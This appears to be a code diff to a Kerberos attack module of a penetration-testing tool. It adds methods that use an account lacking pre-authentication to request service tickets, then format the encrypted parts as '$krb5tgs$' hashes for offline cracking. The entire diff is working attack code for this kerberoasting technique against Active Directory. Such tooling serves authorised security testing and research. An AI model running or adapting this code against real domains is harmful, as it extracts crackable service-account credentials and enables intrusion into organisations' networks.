@@ -104,6 +104,56 @@ class KerberosAttacks:
 
         return entry
 
+    def output_tgs_from_asrep(self, asrep_blob, spn, fd=None):
+        asrep  = decoder.decode(asrep_blob, asn1Spec=AS_REP())[0]
+        realm  = self.domain.upper()
+        enc    = asrep['ticket']['enc-part']
+        etype  = enc['etype']
+        cipher = enc['cipher'].asOctets()
+
+        if etype == constants.EncryptionTypes.rc4_hmac.value:                  # 23
+            chk  = hexlify(cipher[:16]).decode()
+            data = hexlify(cipher[16:]).decode()
+            entry = "$krb5tgs${}$*{}${}${}*${}${}".format(
+                etype,
+                spn.split('/')[0],
+                realm,
+                spn.replace(":", "~"),
+                chk,
+                data,
+            )
+
+        elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value: # 17
+            chk  = hexlify(cipher[-12:]).decode()
+            data = hexlify(cipher[:-12]).decode()
+            entry = "$krb5tgs${}${}${}$*{}*${}${}".format(
+                etype,
+                spn.split('/')[0],
+                realm,
+                spn.replace(":", "~"),
+                chk,
+                data,
+            )
+
+        elif etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value: # 18
+            chk  = hexlify(cipher[-12:]).decode()
+            data = hexlify(cipher[:-12]).decode()
+            entry = "$krb5tgs${}${}${}$*{}*${}${}".format(
+                etype,
+                spn.split('/')[0],
+                realm,
+                spn.replace(":", "~"),
+                chk,
+                data,
+            )
+        else:
+            self.logger.fail(f"[{spn}] etype {etype} not supported")
+            return None
+
+        if fd:
+            fd.write(entry + "\n")
+        return entry
+
     def get_tgt_kerberoasting(self, kcache=None):
         if kcache:
             if getenv("KRB5CCNAME"):
@@ -177,6 +227,28 @@ class KerberosAttacks:
         tgt_data["sessionKey"] = sessionKey
         nxc_logger.debug(f"Final TGT: {tgt_data}")
         return tgt_data
+
+    def get_tgs_no_preauth(self, no_preauth_user, spn):
+        no_pre_princ = Principal(no_preauth_user,
+                                type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        try:
+            ticket, _cipher, _old, _sess = getKerberosTGT(
+                clientName=no_pre_princ,
+                password="",
+                domain=self.domain,
+                lmhash=b"",
+                nthash=b"",
+                aesKey="",
+                kdcHost=self.kdcHost,
+                serverName=spn,
+                kerberoast_no_preauth=True
+            )
+        except Exception as e:
+            nxc_logger.debug(f"Unable to retrieve the ticket for {spn} via {no_preauth_user}: {e}")
+            return None
+
+        return self.output_tgs_from_asrep(ticket, spn)
 
     def get_tgt_asroast(self, userName, requestPAC=True):
         client_name = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
